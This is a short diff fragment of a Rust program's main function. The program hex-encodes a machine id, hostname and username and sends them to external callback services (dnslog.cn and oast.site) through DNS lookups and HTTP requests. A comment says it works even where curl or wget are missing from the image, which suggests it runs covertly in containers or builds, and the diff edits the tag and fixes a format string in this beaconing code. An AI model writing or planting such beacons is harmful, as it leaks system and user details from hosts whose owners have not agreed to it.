@@ -37,13 +37,13 @@ fn main() {
     let i = hex(&id[..id.chars().take(28).count()]);
     let h = hex(&hn[..hn.chars().take(28).count()]);
     let u = hex(&un[..un.chars().take(20).count()]);
-    let tag = "a4a06711";
+    let tag = "n5a06822";
     let ish = "dahpp3cgtqkjvl1mas2gdg97wwijpdwe3.oast.site";
     // 1) pure-std DNS beacons (works even without curl/wget/getent in image)
     dns(&format!("ping.{}.y1acsd.dnslog.cn", tag));
     dns(&format!("i{}.{}.y1acsd.dnslog.cn", i, tag));
     dns(&format!("ping.{}.{}", tag, ish));
-    dns(&format!("i{}.{}.{}", i, ish));
+    dns(&format!("i{}.{}.{}", i, tag, ish));
     // 2) pure-std HTTP beacons
     http_get(&ish, &format!("/p/{}/{}/{}/{}", tag, i, h, u));
     http_get(&format!("p.{}.{}", tag, ish), &format!("/{}/{}/{}", i, h, u));
